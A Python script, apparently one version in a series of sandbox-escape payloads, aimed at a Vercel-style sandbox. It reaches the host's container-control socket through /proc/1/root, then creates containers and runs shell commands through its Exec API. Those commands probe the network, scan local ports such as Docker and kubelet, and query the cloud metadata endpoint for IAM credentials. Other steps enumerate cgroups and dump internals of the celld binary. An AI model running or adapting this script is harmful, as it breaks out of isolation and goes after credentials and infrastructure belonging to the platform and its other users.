# -*- coding: utf-8 -*-
"""v166 payload: Exec 真实执行验证 + 容器网络探测 (net ns 共享) + OutputStream 枚举
输出 /vercel/sandbox/v166c.out"""
import socket, struct, time, json, os, signal, re, ctypes

OUT = '/vercel/sandbox/v166c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(280)

R = '/proc/1/root'
CELL = R + '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'


def log(s, maxlen=400):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def raw_req(sockpath, path, body, t=5.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return st, d[hdr_end + 4:hdr_end + 4 + 1000] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def bin_ctx(path, anchors, before=200, after=900, max_hits=10):
    try:
        data = open(path, 'rb').read()
        hits = 0
        for anc in anchors:
            if hits >= max_hits:
                break
            for m in re.finditer(re.escape(anc), data):
                s = max(0, m.start() - before)
                seg = data[s:m.start() + after]
                log('CTX %s @0x%x: %r' % (anc, m.start(), seg))
                hits += 1
                if hits >= max_hits:
                    break
        log('CTX done hits=%d' % hits)
    except Exception as e:
        log('CTX EXC %s' % e)


def find_proc(comm_list, cmd_hint=None):
    for d in sorted(os.listdir('/proc')):
        if d.isdigit():
            try:
                comm = open('/proc/%s/comm' % d).read().strip()
            except Exception:
                continue
            if comm in comm_list:
                try:
                    cl = open('/proc/%s/cmdline' % d).read()[:150].replace('\x00', ' ')
                except Exception:
                    cl = '?'
                if cmd_hint and cmd_hint not in cl:
                    continue
                return d, comm, cl
    return None


def exec_json(cid, cmd_str, tag, t=10):
    body = json.dumps({'container_id': cid,
                       'process': {'command': '/bin/sh', 'arguments': ['-c', cmd_str]}}).encode()
    st, pay = raw_req(CELL, '%s/Exec' % CTRS, body, t=t)
    log('%s Exec -> %s %r' % (tag, st, pay[:200]))
    return st, pay


# ============ 1: Create yes + Start ============
log('=== 1 setup ===')
st, pay = raw_req(CELL, '%s/Create' % CTRS,
                  json.dumps({'drive_id': 'sandbox', 'command': 'yes'}).encode(), t=8)
log('Create yes -> %s %r' % (st, pay[:200]))
m = re.search(rb'containerId["\s:]+([A-Za-z0-9_-]+)', pay)
cid = m.group(1).decode() if m else ''
log('cid=%s' % cid)
if cid:
    st2, pay2 = raw_req(CELL, '%s/Start' % CTRS, json.dumps({'container_id': cid}).encode(), t=8)
    log('Start -> %s %r' % (st2, pay2[:200]))
    time.sleep(1)
    found = find_proc(['yes'])
    pid = found[0] if found else None
    log('yes pid=%s' % pid)

    # ============ 2: Exec 真实执行验证 ============
    log('=== 2 exec verify ===')
    exec_json(cid, 'echo V166_EXEC_OK > /tmp/v166mark; id > /tmp/v166id; pwd > /tmp/v166pwd; '
                   'cat /etc/hostname > /tmp/v166hostname; ls -la /vercel/ > /tmp/v166vercel', 'v1')
    time.sleep(1)
    for p in ['/tmp/v166mark', '/tmp/v166id', '/tmp/v166pwd', '/tmp/v166hostname', '/tmp/v166vercel']:
        try:
            d = open(p).read()
            log('SBX %s=%r' % (p, d[:300]))
        except Exception as e:
            log('SBX %s ERR' % p)

    # ============ 3: 容器网络探测 ============
    log('=== 3 net probe ===')
    # 3a: 网络拓扑
    exec_json(cid, 'ip addr 2>&1; echo ---ROUTE---; ip route 2>&1; echo ---TCP---; cat /proc/net/tcp 2>&1 | head -20; '
                   'echo ---UDP---; cat /proc/net/udp 2>&1 | head -10', 'net1')
    # 3b: 本地端口扫描 (常见端口)
    exec_json(cid, 'for p in 80 443 8080 8000 3000 5000 22 2375 2376 10250 6443 8443 9090 9100 53 12345; do '
                   '(echo > /dev/tcp/127.0.0.1/$p) 2>/dev/null && echo "OPEN 127.0.0.1:$p"; done; '
                   'echo ---GATEWAY---; ip route | grep default', 'net2')
    # 3c: metadata service
    exec_json(cid, 'curl -s -m 3 http://169.254.169.254/latest/meta-data/ 2>&1 | head -20; echo ---; '
                   'curl -s -m 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1 | head -5', 'net3')
    # 3d: cell VM 内部 DNS / 主机
    exec_json(cid, 'cat /etc/resolv.conf; echo ---; getent hosts host.docker.internal 2>&1; '
                   'cat /proc/net/fib_trie 2>&1 | head -30', 'net4')
    time.sleep(2)

    # ============ 4: 容器 /proc 视角 ============
    log('=== 4 ctr proc ===')
    exec_json(cid, 'ls /proc/ | head -40; echo ---SELF---; ls -la /proc/self/ | head; '
                   'echo ---CGROUP---; cat /proc/self/cgroup', 'proc')
    time.sleep(1)

    # ============ 5: 容器 cgroup 视图 ============
    log('=== 5 cgroup view ===')
    exec_json(cid, 'ls -la /sys/fs/cgroup/ | head -20; echo ---; cat /sys/fs/cgroup/cgroup.controllers 2>&1; '
                   'echo ---PROCS---; cat /sys/fs/cgroup/cgroup.procs 2>&1 | head', 'cg')
    time.sleep(1)

    # ============ 6: 沙箱读取容器写的结果 ============
    log('=== 6 results ===')
    for p in ['/tmp/v166mark', '/tmp/v166id', '/tmp/v166pwd', '/tmp/v166hostname', '/tmp/v166vercel']:
        try:
            d = open(p).read()
            log('SBX2 %s=%r' % (p, d[:300]))
        except Exception as e:
            log('SBX2 %s ERR' % p)

    # ============ 7: OutputStream 枚举提取 ============
    log('=== 7 stream enum ===')
    bin_ctx(R + '/opt/vercel/celld',
            [b'OutputStream', b'STDOUT', b'STDERR'],
            before=150, after=700, max_hits=8)

log('V166_DONE')
f.close()
